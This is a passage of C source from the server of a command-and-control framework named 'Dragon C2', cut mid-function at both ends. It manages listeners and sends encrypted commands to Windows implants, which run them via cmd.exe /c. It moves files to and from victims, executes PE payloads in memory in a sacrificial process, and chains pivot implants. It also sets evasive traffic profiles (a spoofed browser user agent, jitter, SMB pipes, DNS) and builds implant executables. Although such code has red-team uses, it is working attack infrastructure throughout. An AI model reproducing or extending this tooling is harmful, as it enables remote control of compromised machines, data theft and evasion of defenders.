        struct sockaddr_in client_addr;
        transport_conn_t *conn = ls->trans->accept(ls->handle,
                                                    &client_addr);
        if (!conn) {
            if (!ls->active) break;
            perror("accept failed");
            continue;
        }
        if (ls->occupied) {
            printf("Port %d already occupied, rejecting\n", ls->port);
            ls->trans->close(conn);
            continue;
        }
        ls->occupied = 1;
        printf("Port %d accepted %s:%d\n", ls->port,
               inet_ntoa(client_addr.sin_addr),
               ntohs(client_addr.sin_port));

        CLIENT *new_client = malloc(sizeof(CLIENT));
        memset(new_client, 0, sizeof(CLIENT));
        if (!new_client) {
            perror("malloc client");
            ls->trans->close(conn);
            ls->occupied = 0;
            continue;
        }
        new_client->conn    = conn;
        new_client->trans   = ls->trans;
        new_client->address = client_addr;
        new_client->level   = 1;
        strncpy(new_client->father, "server", ID_LEN-1);
        new_client->father[ID_LEN-1] = '\0';
        new_client->child[0]   = '\0';
        new_client->status     = "active";
        new_client->test       = "NEW";
        new_client->last_beacon= time(NULL);
        new_client->id         = NULL;
        strncpy(new_client->listener_name, ls->name, sizeof(new_client->listener_name) - 1);
        new_client->listener_name[sizeof(new_client->listener_name) - 1] = '\0';
        new_client->shell_pkt_ready = 0;
        pthread_mutex_init(&new_client->shell_pkt_mu, NULL);
        pthread_cond_init(&new_client->shell_pkt_cond, NULL);
        pthread_mutex_init(&new_client->crypto_mu, NULL);
        shell_q_init(&new_client->shell_q);

        ls->client = new_client;
        add_client(new_client);

        ConnectionData *connData = malloc(sizeof(ConnectionData));
        if (!connData) {
            perror("malloc connData");
            ls->trans->close(conn);
            free(new_client);
            ls->occupied = 0;
            continue;
        }
        connData->client   = new_client;
        connData->listener = ls;

        pthread_t handler_thread;
        if (pthread_create(&handler_thread, NULL,
                           handle_connection, connData) != 0) {
            perror("pthread_create");
            ls->trans->close(conn);
            free(new_client);
            free(connData);
            ls->occupied = 0;
            continue;
        }
        pthread_detach(handler_thread);
    }
    printf("Listener thread port %d exiting\n", ls->port);
    return NULL;
}

static void profile_set_defaults(malleable_profile_t *p)
{
    memset(p, 0, sizeof(*p));
    p->beacon_interval_s = 20;
    p->jitter_pct = 20;
    p->reconnect_delay_ms = 5000;
    p->dns_poll_ms = 3000;
    strncpy(p->http_user_agent,
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Safari/537.36",
            MP_USER_AGENT_MAX - 1);
    strncpy(p->http_content_type, "application/octet-stream",
            MP_CONTENT_TYPE_MAX - 1);
    strncpy(p->http_path_data, "/c2", MP_PATH_MAX - 1);
    strncpy(p->http_path_hs, "/c2/hs", MP_PATH_MAX - 1);
    strncpy(p->smb_pipe_name, "dragon_pipe", MP_PIPE_NAME_MAX - 1);
}

/* =========================================================================
 * start / stop / list listeners
 * ====================================================================== */

/* =========================================================================
 * start_listen_on_port
 *
 * Creates a listener on the given port and protocol.
 * Spawns listener_thread. Returns 0 on success, -1 on failure.
 * ====================================================================== */
int start_listen_on_port(const char *name, const char *proto, int port, const malleable_profile_t *prof) {
    if (registry_name_exists(name)) {
        printf("[!] Listener name \"%s\" already exists\n", name);
        return -1;
    }
    transport_t *trans = transport_get(proto);
    if (!trans) {
        fprintf(stderr, "Unknown transport: %s\n", proto);
        return -1;
    }
    int handle = trans->listen(port);
    if (handle < 0) {
        fprintf(stderr, "[%s] listen failed on port %d\n",
                trans->name, port);
        return -1;
    }
    ListeningSocket *ls = malloc(sizeof(ListeningSocket));
    if (!ls) {
        perror("malloc ls");
        trans->close_listener(handle);
        return -1;
    }
    ls->trans    = trans;
    ls->handle   = handle;
    ls->port     = port;
    snprintf(ls->name, sizeof(ls->name), "%s", name);
    ls->active   = 1;
    ls->occupied = 0;
    ls->next     = NULL;
    ls->client   = NULL;

    if (prof)
        memcpy(&ls->profile, prof, sizeof ls->profile);
    else
        profile_set_defaults(&ls->profile);

    if (pthread_create(&ls->thread, NULL, listener_thread, ls) != 0) {
        perror("pthread_create");
        trans->close_listener(handle);
        free(ls);
        return -1;
    }
    pthread_detach(ls->thread);

    pthread_mutex_lock(&list_mutex);
    ls->next       = head_listeners;
    head_listeners = ls;
    pthread_mutex_unlock(&list_mutex);

    printf("Started listening on port %d using %s\n", port, trans->name);
    registry_add_listener(name, port, proto, -1, prof);
    return 0;
}

/* =========================================================================
 * stop_listen_on_port
 *
 * Stops the listener on the given port. Closes the socket and removes
 * it from the list.
 * ====================================================================== */
int stop_listen_on_port(const char *name) {
    pthread_mutex_lock(&list_mutex);
    ListeningSocket **curr = &head_listeners;
    while (*curr) {
        ListeningSocket *ls = *curr;
        if (strcmp(ls->name, name) == 0) {
            ls->active = 0;
            if (ls->trans && ls->trans->close_listener)
                ls->trans->close_listener(ls->handle);
            *curr = ls->next;
            free(ls);
            printf("Stopped listener \"%s\" (port %d)\n", ls->name, ls->port);
            pthread_mutex_unlock(&list_mutex);
            registry_remove_listener(name);
            return 0;
        }
        curr = &(*curr)->next;
    }
    pthread_mutex_unlock(&list_mutex);
    printf("No listener named \"%s\"\n", name);
    return -1;
}

/* =========================================================================
 * list_listeners
 *
 * Prints all active listeners: port, protocol, connected client.
 * ====================================================================== */
void list_listeners() {
    pthread_mutex_lock(&list_mutex);
    ListeningSocket *curr = head_listeners;
    if (!curr) { printf("No active listeners.\n"); }
    while (curr) {
        printf("Port %d [%s] occupied: %s\n",
               curr->port,
               curr->trans ? curr->trans->name : "?",
               curr->occupied ? "YES" : "NO");
        curr = curr->next;
    }
    pthread_mutex_unlock(&list_mutex);
}

/* =========================================================================
 * Command helpers
 * ====================================================================== */

/* =========================================================================
 * send_command_to_client
 *
 * Sends a command (0x02) for execution. Client runs it with cmd.exe /c
 * and returns output as 0x02 packets.
 * ====================================================================== */
void send_command_to_client(int port, int level,
                             const char *target_id, char cmd[256]) {
    size_t len = strlen(cmd);
    while (len && (cmd[len-1] == '\n' || cmd[len-1] == '\r'))
        cmd[--len] = '\0';

    pthread_mutex_lock(&list_mutex);
    ListeningSocket *curr = head_listeners;
    while (curr) {
        if (curr->port == port && curr->occupied
            && curr->client != NULL) {
            CLIENT *nexthop = curr->client;
            CLIENT *dst = NULL;
            if (level > 1) {
                dst = return_client_by_id(target_id);
                if (!dst) {
                    printf("[ERROR] Unknown route to %s\n", target_id);
                    pthread_mutex_unlock(&list_mutex);
                    return;
                }
            }
            PACKET_DRAGON packet;
            memset(&packet, 0, sizeof packet);
            snprintf(packet.opCode, sizeof packet.opCode,
                     "0x%02X", OPCODE_EXEC_CMD);
            size_t max_cmd = (level > 1)
               ? sizeof(packet.payload) - TAG_LEN - 1
               : sizeof(packet.payload) - 1;
            strncpy(packet.payload, cmd, max_cmd);
            packet.payload[max_cmd] = '\0';
            packet.payload_size = (uint16_t)strlen(packet.payload);
            packet.target_level = level;
            strncpy(packet.target_id, target_id, ID_LEN - 1);

            if (level > 1) {
                uint16_t blob_len = 0;
                uint8_t tmp_cmd[PLAINTEXT_SIZE];
                memcpy(tmp_cmd, packet.payload, packet.payload_size);
                if (dragon_encryption_blob(dst->key_tx, dst->iv_tx,
                                            &dst->tx_ctr,
                                            tmp_cmd,
                                            packet.payload_size,
                                            (uint8_t*)packet.payload,
                                            &blob_len) != 0) {
                    printf("[ERROR] Payload encryption failed\n");
                    pthread_mutex_unlock(&list_mutex);
                    return;
                }
                packet.payload_size = blob_len;
            }
            if (send_packet(nexthop->conn, nexthop->trans,
                             nexthop->key_tx, nexthop->iv_tx, &nexthop->tx_ctr, nexthop->ck_tx,
                             &nexthop->tx_epoch, &packet) == 0)
                printf("[COMMAND] Sent to %s (level %d)\n",
                       target_id, level);
            else
                printf("[COMMAND] Failed to send to %s\n", target_id);
            break;
        }
        curr = curr->next;
    }
    pthread_mutex_unlock(&list_mutex);
}

/* =========================================================================
 * send_start_listener_to_client
 *
 * Sends 0x0B telling client to start a listener on the given port
 * and transport. Client spawns a listener_thread.
 * ====================================================================== */
void send_start_listener_to_client(int port, int level,
                                    const char *target_id,
                                    int listener_port,
                                    const char *transport_type,
                                    const char *listener_name) {
    if (registry_name_exists(listener_name)) {
        printf("[!] Listener name \"%s\" already exists\n", listener_name);
        return;
    }
    pthread_mutex_lock(&list_mutex);
    ListeningSocket *curr = head_listeners;
    while (curr) {
        if (curr->port == port && curr->occupied
            && curr->client != NULL) {
            CLIENT *nexthop = curr->client;
            CLIENT *dst = NULL;
            if (level > 1) {
                dst = return_client_by_id(target_id);
                if (!dst) {
                    pthread_mutex_unlock(&list_mutex); return;
                }
            }
            PACKET_DRAGON pkt = {0};
            snprintf(pkt.opCode, sizeof pkt.opCode, "0x0B");
            pkt.target_level = level;
            strncpy(pkt.target_id, target_id, ID_LEN - 1);
            int text_len = snprintf(pkt.payload, sizeof pkt.payload, "%s %d %s", transport_type, listener_port, listener_name);
            text_len += 1;
            uint16_t prof_len = 0;
            profile_serialize(&g_profile, (uint8_t *)pkt.payload + text_len, &prof_len);
            pkt.payload_size = (uint16_t)(text_len + prof_len);
            if (level > 1) {
                uint16_t blob_len = 0;
                uint8_t tmp_sl[PLAINTEXT_SIZE];
                memcpy(tmp_sl, pkt.payload, pkt.payload_size);
                if (dragon_encryption_blob(dst->key_tx, dst->iv_tx,
                                        &dst->tx_ctr,
                                        tmp_sl,
                                        pkt.payload_size,
                                        (uint8_t*)pkt.payload, &blob_len) != 0) {
                    pthread_mutex_unlock(&list_mutex);
                    return;
                }
                pkt.payload_size = blob_len;
            }
            if (send_packet(nexthop->conn, nexthop->trans, nexthop->key_tx, nexthop->iv_tx, &nexthop->tx_ctr, nexthop->ck_tx, &nexthop->tx_epoch, &pkt) == 0) {
                printf("[INFO] 0x0B sent -> %s (name=%s), waiting for ACK\n", target_id, listener_name);
            } else
                printf("[ERROR] Failed start listener -> %s\n", target_id);
            break;
        }
        curr = curr->next;
    }
    pthread_mutex_unlock(&list_mutex);
}

/* =========================================================================
 * send_stop_listener_to_client
 *
 * Sends 0x0C telling client to stop the listener on the given port.
 * ====================================================================== */
void send_stop_listener_to_client(int port, int level,
                                   const char *target_id,
                                   const char *listener_name) {
    pthread_mutex_lock(&list_mutex);
    ListeningSocket *curr = head_listeners;
    while (curr) {
        if (curr->port == port && curr->occupied
            && curr->client != NULL) {
            CLIENT *nexthop = curr->client;
            CLIENT *dst = NULL;
            if (level > 1) {
                dst = return_client_by_id(target_id);
                if (!dst) {
                    pthread_mutex_unlock(&list_mutex); return;
                }
            }
            PACKET_DRAGON pkt = {0};
            snprintf(pkt.opCode, sizeof pkt.opCode, "0x0C");
            pkt.target_level = level;
            strncpy(pkt.target_id, target_id, ID_LEN - 1);
            snprintf(pkt.payload, sizeof pkt.payload - TAG_LEN,
                     "%s", listener_name);
            pkt.payload_size = (uint16_t)strlen(pkt.payload);
            if (level > 1) {
                uint16_t blob_len = 0;
                uint8_t tmp_stl[PLAINTEXT_SIZE];
                memcpy(tmp_stl, pkt.payload, pkt.payload_size);
                if (dragon_encryption_blob(dst->key_tx, dst->iv_tx,
                                        &dst->tx_ctr,
                                        tmp_stl,
                                        pkt.payload_size,
                                        (uint8_t*)pkt.payload, &blob_len) != 0) {
                    pthread_mutex_unlock(&list_mutex);
                    return;
                }
                pkt.payload_size = blob_len;
            }
            if (send_packet(nexthop->conn, nexthop->trans, nexthop->key_tx, nexthop->iv_tx, &nexthop->tx_ctr, nexthop->ck_tx, &nexthop->tx_epoch, &pkt) == 0) {
                printf("[INFO] Stop listener \"%s\" -> %s\n",
                       listener_name, target_id);
                CLIENT *target = (level > 1 && dst) ? dst : nexthop;
                RemoteListener **pp = &target->remote_listeners;
                while (*pp) {
                    if (strcmp((*pp)->name, listener_name) == 0) {
                        RemoteListener *dead = *pp;
                        *pp = dead->next;
                        free(dead);
                        break;
                    }
                    pp = &(*pp)->next;
                }
                registry_remove_listener(listener_name);
            } else
                printf("[ERROR] Failed stop listener -> %s\n", target_id);
            break;
        }
        curr = curr->next;
    }
    pthread_mutex_unlock(&list_mutex);
}

/* =========================================================================
 * file_send_packet
 *
 * Builds and sends one packet with the given opcode and payload.
 * For level > 1, adds inner encryption with sub-client keys.
 * Used by upload, download, and execmem functions.
 * Returns 0 on success, -1 on failure.
 * ====================================================================== */
static int file_send_packet(CLIENT *nexthop, CLIENT *dst, int level, const char *target_id, const char *opcode, const void *payload_data, size_t payload_len) {
    PACKET_DRAGON p = {0};
    strcpy(p.opCode, opcode);
    p.target_level = level;
    strncpy(p.target_id, target_id, ID_LEN - 1);
    size_t max_clear = (level > 1 && dst)
                 ? sizeof(p.payload) - TAG_LEN - CTR_HDR
                 : sizeof(p.payload);
    if(payload_len > max_clear) {
        return -1;
    }
    memcpy(p.payload, payload_data, payload_len);
    p.payload_size = (uint16_t)payload_len;
    if(level > 1 && dst) {
        uint16_t bl = 0;
        uint8_t tmp_fsp[PLAINTEXT_SIZE];
        memcpy(tmp_fsp, p.payload, p.payload_size);
        if(dragon_encryption_blob(dst->key_tx, dst->iv_tx, &dst->tx_ctr, tmp_fsp, p.payload_size, (uint8_t*)p.payload, &bl) != 0) {
            return -1;
        }
        p.payload_size = bl;
    }
    return send_packet(nexthop->conn, nexthop->trans, nexthop->key_tx, nexthop->iv_tx, &nexthop->tx_ctr, nexthop->ck_tx, &nexthop->tx_epoch, &p);
}

/* =========================================================================
 * send_file_to_client (UPLOAD: server -> client)
 *
 * Sends a local file to the client. Protocol:
 *   0x17 -> start (file size + remote path)
 *   0x18 -> data chunks × N
 *   0x19 -> end
 * Client writes file to disk and sends 0x1A ACK.
 * ====================================================================== */
void send_file_to_client(int port, int level, const char *target_id, const char *local_path, const char *remote_path) {
    pthread_mutex_lock(&list_mutex);
    ListeningSocket *ls = head_listeners;
    while(ls && !(ls->port == port && ls->occupied && ls->client)) {
        ls = ls->next;
    }
    pthread_mutex_unlock(&list_mutex);
    if(!ls) {
        printf("[-] No client found on port %d\n", port);
        return;
    }
    CLIENT *nexthop = ls->client;
    CLIENT *dst = NULL;
    if(level > 1) {
        dst = return_client_by_id(target_id);
        if(!dst) {
            printf("[-] No client %s found\n", target_id);
            return;
        }
    }
    printf("localpath %s\n", local_path);
    FILE *fp = fopen(local_path, "rb");
    if(!fp) {
        perror("[ERROR] fopen");
        return;
    }
    fseek(fp, 0, SEEK_END);
    uint64_t total_size = (uint64_t)ftell(fp);
    rewind(fp);

    /* 0x17: START */
    uint8_t start_payload[8 + 512] = {0};
    memcpy(start_payload, &total_size, 8);
    size_t pathlen = strlen(remote_path);
    if(pathlen > 511) pathlen = 511;
    memcpy(start_payload + 8, remote_path, pathlen);

    if(file_send_packet(nexthop, dst, level, target_id, "0x17", start_payload, 8 + pathlen) != 0) {
        printf("[ERROR] Send START failed\n");
        goto done;
    } 
    printf("[UPLOAD] Start: %s -> %s (%llu byte)\n", local_path, remote_path, (unsigned long long)total_size);
    /* 0x18: CHUNK × N */
    uint8_t  chunk_buf[4 + FILE_CHUNK_SIZE];
    uint32_t chunk_idx = 0;
    size_t   n;

    while((n = fread(chunk_buf + 4, 1, FILE_CHUNK_SIZE, fp)) > 0) {
        uint32_t idx_le = chunk_idx;
        memcpy(chunk_buf, &idx_le, 4);
        if (file_send_packet(nexthop, dst, level, target_id,
                                "0x18", chunk_buf, 4 + n) != 0) {
            printf("[ERROR] Send chunk %u failed\n", chunk_idx);
            goto done;
        }
        chunk_idx++;
    }

    /* 0x19: END */
    if (file_send_packet(nexthop, dst, level, target_id, "0x19", &total_size, 8) != 0) {
        printf("[ERROR] Send END failed\n");
        goto done;
    }
    printf("[UPLOAD] Complete: %llu byte sent\n", (unsigned long long)total_size);

done:
    fclose(fp);
}

/* =========================================================================
 * send_file_download_request  (DOWNLOAD: client -> server)
 *
 * Asks client to send a file. Sends 0x14 with remote path.
 * Client reads file and sends 0x15 chunks + 0x16 end.
 * Server writes chunks to local file in handle_connection.
 * ====================================================================== */
void send_file_download_request(int port, int level, const char *target_id, const char *remote_path, const char *local_path) {
    pthread_mutex_lock(&list_mutex);
    ListeningSocket *ls = head_listeners;
    while(ls && !(ls->port == port && ls->occupied && ls->client)) {
        ls = ls->next;
    }
    pthread_mutex_unlock(&list_mutex);
    if(!ls) {
        printf("[-] No client found on port %d\n", port);
        return;
    }
    CLIENT *nexthop = ls->client;
    CLIENT *dst = NULL;
    if(level > 1) {
        dst = return_client_by_id(target_id);
        if(!dst) {
            printf("[-] No client %s found\n", target_id);
            return;
        }
    }
    CLIENT *target = (level > 1) ? dst : nexthop;
    if (target->xfer_dl_active) {
        printf("[ERROR] Download in progress for this client\n");
        return;
    }
    target->xfer_dl_fp = fopen(local_path, "wb");
    if (!target->xfer_dl_fp) {
        perror("[ERROR] fopen");
        return;
    }
    strncpy(target->xfer_dl_local, local_path, sizeof(target->xfer_dl_local) - 1);
    target->xfer_dl_bytes = 0;
    target->xfer_dl_active = 1;

    PACKET_DRAGON pkt = {0};
    strcpy(pkt.opCode, "0x14");
    pkt.target_level = level;
    strncpy(pkt.target_id, target_id, ID_LEN - 1);
    size_t max_path = (level > 1 && dst)
                ? sizeof(pkt.payload) - TAG_LEN - 1
                : sizeof(pkt.payload) - 1;
    strncpy(pkt.payload, remote_path, max_path);
    pkt.payload[max_path] = '\0';
    pkt.payload_size = (uint16_t)strlen(pkt.payload);

    if (level > 1 && dst) {
        uint16_t bl = 0;
        uint8_t tmp_dl[PLAINTEXT_SIZE];
        memcpy(tmp_dl, pkt.payload, pkt.payload_size);
        if (dragon_encryption_blob(dst->key_tx, dst->iv_tx, &dst->tx_ctr, tmp_dl, pkt.payload_size, (uint8_t*)pkt.payload, &bl) != 0) {
            printf("[ERROR] Encrypt 0x14 start download failed\n");
            fclose(target->xfer_dl_fp);
            target->xfer_dl_fp = NULL;
            target->xfer_dl_active = 0;
            return;
        }
        pkt.payload_size = bl;
    }
    if (send_packet(nexthop->conn, nexthop->trans,
                             nexthop->key_tx, nexthop->iv_tx, &nexthop->tx_ctr, nexthop->ck_tx,
                             &nexthop->tx_epoch, &pkt) == 0) {
        printf("[DOWNLOAD] Request sent: %s -> %s\n", remote_path, local_path);
    } else {
        printf("[ERROR] Sending download request 0x14 failed\n");
        fclose(target->xfer_dl_fp);
        target->xfer_dl_fp = NULL;
        target->xfer_dl_active = 0;
    }
}

/* =========================================================================
 * send_exec_memory
 *
 * Sends a PE to the client for in-memory execution. Protocol:
 *   0x1E -> start (PE size)
 *   0x20 -> args chunks (if any) + empty terminator
 *   0x1F -> PE data chunks × N
 * Client detects native/.NET from PE header and runs it in a sacrificial process. Output comes back as 0x02.
 * ====================================================================== */
void send_exec_memory(int port, int level, const char *target_id,
                       const char *local_path, const char *args)
{
    pthread_mutex_lock(&list_mutex);
    ListeningSocket *ls = head_listeners;
    while (ls && !(ls->port == port && ls->occupied && ls->client))
        ls = ls->next;
    pthread_mutex_unlock(&list_mutex);
 
    if (!ls) {
        printf("[-] No client on port %d\n", port);
        return;
    }
 
    CLIENT *nexthop = ls->client;
    CLIENT *dst     = NULL;
    if (level > 1) {
        dst = return_client_by_id(target_id);
        if (!dst) {
            printf("[ERROR] Client %s not found\n", target_id);
            return;
        }
    }
 
    FILE *fp = fopen(local_path, "rb");
    if (!fp) {
        perror("[ERROR] fopen");
        return;
    }
    fseek(fp, 0, SEEK_END);
    uint64_t total_size = (uint64_t)ftell(fp);
    rewind(fp);
 
    printf("[EXEC] File: %s (%llu byte)\n",
           local_path, (unsigned long long)total_size);
 
    /* -- 0x1B: START [1 byte reserved][8 byte PE size] -- */
    uint8_t start[9] = {0};
    start[0] = 0;  
    memcpy(start + 1, &total_size, 8);
 
    if (file_send_packet(nexthop, dst, level, target_id,
                          "0x1B", start, sizeof start) != 0) {
        printf("[ERROR] Invio 0x1B failed\n");
        fclose(fp);
        return;
    }
    printf("[EXEC] 0x1B START sent\n");
 
    if (args && strlen(args) > 0) {
        const char *ap  = args;
        size_t      rem = strlen(args);
 
        while (rem > 0) {
            size_t chunk = rem > FILE_CHUNK_SIZE ? FILE_CHUNK_SIZE : rem;
            if (file_send_packet(nexthop, dst, level, target_id,
                                  "0x1D", ap, chunk) != 0) {
                printf("[ERROR] Sending args chunk failed\n");
                fclose(fp);
                return;
            }
            ap  += chunk;
            rem -= chunk;
        }
        if (file_send_packet(nexthop, dst, level, target_id,
                              "0x1D", "", 0) != 0) {
            printf("[ERROR] Sending args terminator failed\n");
            fclose(fp);
            return;
        }
        printf("[EXEC] 0x1D ARGS sent (%zu byte)\n", strlen(args));
    }
 
    /* -- C: CHUNK × N -- */
    uint8_t  chunk_buf[4 + FILE_CHUNK_SIZE];
    uint32_t chunk_idx = 0;
    size_t   n;
 
    while ((n = fread(chunk_buf + 4, 1, FILE_CHUNK_SIZE, fp)) > 0) {
        uint32_t idx_le = chunk_idx;
        memcpy(chunk_buf, &idx_le, 4);
 
        if (file_send_packet(nexthop, dst, level, target_id,
                              "0x1C", chunk_buf, 4 + n) != 0) {
            printf("[ERROR] Chunk %u failed\n", chunk_idx);
            break;
        }
        chunk_idx++;
    }
 
    fclose(fp);
    printf("[EXEC] PE sent (%u chunk) -> execution started into the client\n",
           chunk_idx);
}

/* =========================================================================
 * Utility
 * ====================================================================== */

/* =========================================================================
 * trim_newline
 *
 * Removes trailing \n and \r from a string.
 * ====================================================================== */
void trim_newline(char *str) {
    size_t len = strlen(str);
    if (len > 0 && str[len-1] == '\n') str[len-1] = '\0';
}

/* =========================================================================
 * load_server_key
 *
 * Reads the 32-byte X25519 private key from server_priv.bin.
 * Called once at startup. Exits if file is missing.
 * ====================================================================== */
void load_server_key(void) {
    FILE *f = fopen("server_priv.bin", "rb");
    if (!f || fread(server_priv, 1, 32, f) != 32) {
        fprintf(stderr, "Cannot read server_priv.bin\n");
        exit(EXIT_FAILURE);
    }
    fclose(f);
}

/* =========================================================================
 * File-based Malleable Profile
 *
 * Loads/saves a malleable_profile_t from/to a text file (profile.conf).
 * Format: key = value, one per line. Lines starting with # are comments.
 * Used by the 'generate' command to avoid hardcoded profile values.
 * ====================================================================== */

#define PROFILE_CONF_PATH "profile.conf"

static int g_profile_loaded = 0;

static void str_trim(char *s)
{
    char *end = s + strlen(s) - 1;
    while (end >= s && (*end == ' ' || *end == '\t' || *end == '\n' || *end == '\r'))
        *end-- = '\0';
    char *start = s;
    while (*start == ' ' || *start == '\t')
        start++;
    if (start != s)
        memmove(s, start, strlen(start) + 1);
}

static int profile_load_from_file(const char *path, malleable_profile_t *p)
{
    profile_set_defaults(p);

    FILE *f = fopen(path, "r");
    if (!f)
        return -1;

    char line[1024];
    int count = 0;

    while (fgets(line, sizeof(line), f)) {
        str_trim(line);
        if (line[0] == '#' || line[0] == '\0')
            continue;

        char *eq = strchr(line, '=');
        if (!eq)
            continue;

        *eq = '\0';
        char *key = line;
        char *val = eq + 1;
        str_trim(key);
        str_trim(val);

        if (strcmp(key, "beacon_interval_s") == 0)
            p->beacon_interval_s = (uint16_t)atoi(val);
        else if (strcmp(key, "jitter_pct") == 0)
            p->jitter_pct = (uint8_t)atoi(val);
        else if (strcmp(key, "reconnect_delay_ms") == 0)
            p->reconnect_delay_ms = (uint16_t)atoi(val);
        else if (strcmp(key, "http_user_agent") == 0)
            strncpy(p->http_user_agent, val, MP_USER_AGENT_MAX - 1);
        else if (strcmp(key, "http_content_type") == 0)
            strncpy(p->http_content_type, val, MP_CONTENT_TYPE_MAX - 1);
        else if (strcmp(key, "http_path_data") == 0)
            strncpy(p->http_path_data, val, MP_PATH_MAX - 1);
        else if (strcmp(key, "http_path_hs") == 0)
            strncpy(p->http_path_hs, val, MP_PATH_MAX - 1);
        else if (strcmp(key, "http_extra_headers") == 0)
            strncpy(p->http_extra_headers, val, MP_EXTRA_HEADERS_MAX - 1);
        else if (strcmp(key, "smb_pipe_name") == 0)
            strncpy(p->smb_pipe_name, val, MP_PIPE_NAME_MAX - 1);
        else if (strcmp(key, "dns_domain") == 0)
            strncpy(p->dns_domain, val, MP_DNS_DOMAIN_MAX - 1);
        else if (strcmp(key, "dns_poll_ms") == 0)
            p->dns_poll_ms = (uint16_t)atoi(val);
        else if (strcmp(key, "pkt_pad_min") == 0)
            p->pkt_pad_min = (uint16_t)atoi(val);
        else if (strcmp(key, "pkt_pad_max") == 0)
            p->pkt_pad_max = (uint16_t)atoi(val);
        else
            printf("[PROFILE] unknown key: '%s'\n", key);

        count++;
    }

    fclose(f);
    printf("[PROFILE] loaded %d settings from %s\n", count, path);
    return 0;
}

static void profile_reload(void)
{
    if (profile_load_from_file(PROFILE_CONF_PATH, &g_profile) == 0)
        g_profile_loaded = 1;
    else
        printf("[PROFILE] %s not found, using defaults\n", PROFILE_CONF_PATH);
}

static int profile_save_default(const char *path)
{
    FILE *f = fopen(path, "r");
    if (f) {
        fclose(f);
        return 0;
    }

    int fd = open(path, O_WRONLY | O_CREAT | O_EXCL, 0666);
    if (fd < 0) return -1;
    f = fdopen(fd, "w");
    if (!f) {
        printf("[PROFILE] cannot create %s\n", path);
        return -1;
    }

    fprintf(f,
        "# Dragon C2 - Malleable Profile Configuration\n"
        "# Edit before running 'generate'. Future GUI will use this file.\n"
        "#\n"
        "# Lines starting with # are comments.\n"
        "# Format: key = value\n"
        "\n"
        "# -- Beacon behavior --\n"
        "beacon_interval_s = 20\n"
        "jitter_pct = 20\n"
        "reconnect_delay_ms = 5000\n"
        "\n"
        "# -- HTTP / HTTPS --\n"
        "http_user_agent = Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/120.0.0.0 Safari/537.36\n"
        "http_content_type = application/octet-stream\n"
        "http_path_data = /c2\n"
        "http_path_hs = /c2/hs\n"
        "http_extra_headers = \n"
        "\n"
        "# -- SMB --\n"
        "smb_pipe_name = dragon_pipe\n"
        "\n"
        "# -- DNS --\n"
        "dns_domain = \n"
        "dns_poll_ms = 3000\n"
    );

    fclose(f);
    printf("[PROFILE] created default %s\n", path);
    return 0;
}

/* =========================================================================
 * generate_client
 *
 * Cross-compiles a Windows client from the server using CMake and
 * the MinGW toolchain. Writes client_config.h via CMake's
 * configure_file, copies server_pub.h into the client source tree,
 * and builds the client executable. Requires x86_64-w64-mingw32-gcc
 * and MinGW dependencies in deps/mingw64/.
 * ====================================================================== */

#define CLIENT_SRC_DIR  "./client"
#define OUTPUT_DIR      "./output"

static void generate_client(const char *transport, int level, const char *host, int port,
                            const char *father_ip, int father_port,
                            const char *listener_name,
                            const malleable_profile_t *profile) {
    FILE *f = fopen("server_pub.h", "r");
    if (!f) {
        printf("[ERROR] server_pub.h not found - run keygen first\n");
        return;
    }
    fclose(f);

    char cp_cmd[512];
    snprintf(cp_cmd, sizeof cp_cmd, "cp server_pub.h %s/", CLIENT_SRC_DIR);
    if (system(cp_cmd) != 0) {
        printf("[ERROR] Failed to copy server_pub.h to %s/\n", CLIENT_SRC_DIR);
        return;
    }

    mkdir(OUTPUT_DIR, 0755);

    char cwd[512];
    if (!getcwd(cwd, sizeof cwd)) {
        printf("[ERROR] Cannot get working directory\n");
        return;
    }

    char cmd[4096];

    snprintf(cmd, sizeof cmd,
        "cmake -S %s -B %s/build "
        "-DCMAKE_TOOLCHAIN_FILE=%s/cmake/mingw-w64-toolchain.cmake "
        "-DCLIENT_LEVEL=%d "
        "-DSERVER_IP=%s "
        "-DSERVER_PORT=%d "
        "-DFATHER_IP=%s "
        "-DFATHER_PORT=%d "
        "-DFATHER_LISTENER_NAME=\\\"%s\\\" "
        "-DUPSTREAM_TRANSPORT=%s "
        "-DBEACON_INTERVAL=%d "
        "-DDNS_DOMAIN=%s "
        "-DDNS_POLL_MS=%d "
        "-DJITTER_PCT=%d "
        "-DRECONNECT_DELAY_MS=%d "
        "-DHTTP_USER_AGENT=\"%s\" "
        "-DHTTP_CONTENT_TYPE=\"%s\" "
        "-DHTTP_PATH_DATA=\"%s\" "
        "-DHTTP_PATH_HS=\"%s\" "
        "-DHTTP_EXTRA_HEADERS=\"%s\" "
        "-DSMB_PIPE_NAME=\"%s\" "
        "-DFATHER_LISTENER_NAME=\"%s\" "
        "&& cmake --build %s/build 2>&1",
        CLIENT_SRC_DIR, OUTPUT_DIR,
        cwd,
        level, host, port, father_ip, father_port, listener_name,
        transport,
        profile->beacon_interval_s,
        profile->dns_domain,
        profile->dns_poll_ms,
        profile->jitter_pct,
        profile->reconnect_delay_ms,
        profile->http_user_agent,
        profile->http_content_type,
        profile->http_path_data,
        profile->http_path_hs,
        profile->http_extra_headers,
        profile->smb_pipe_name,
        listener_name,
        OUTPUT_DIR);

    if (strcmp(transport, "dns") == 0)
        printf("[GENERATE] Building client (level=%d, %s, domain=%s, resolver=%s:%d, beacon=%ds)\n",
            level, transport, profile->dns_domain, host, port, profile->beacon_interval_s);
    else
        printf("[GENERATE] Building client (level=%d, %s, %s:%d, beacon=%ds)\n",
            level, transport, host, port, profile->beacon_interval_s);
    fflush(stdout);

    FILE *proc = popen(cmd, "r");
    if (!proc) {
        printf("[ERROR] Failed to run cmake\n");
        return;
    }

    char line[512];
    while (fgets(line, sizeof line, proc))
        printf("  %s", line);

    int status = pclose(proc);
    if (status == 0) {
        char final_name[512];
        if (strcmp(transport, "smb") == 0)
            snprintf(final_name, sizeof final_name,
                     "%s/client_L%d_%s_%s_%s.exe",
                     OUTPUT_DIR, level, transport, host, profile->smb_pipe_name);
        else
            snprintf(final_name, sizeof final_name,
                     "%s/client_L%d_%s_%s_%d.exe",
                     OUTPUT_DIR, level, transport, host, port);
        char mv_cmd[1024];
        snprintf(mv_cmd, sizeof mv_cmd,
                 "cp %s/build/client.exe %s", OUTPUT_DIR, final_name);
        system(mv_cmd);
        printf("[GENERATE] Success: %s\n", final_name);
    } else {
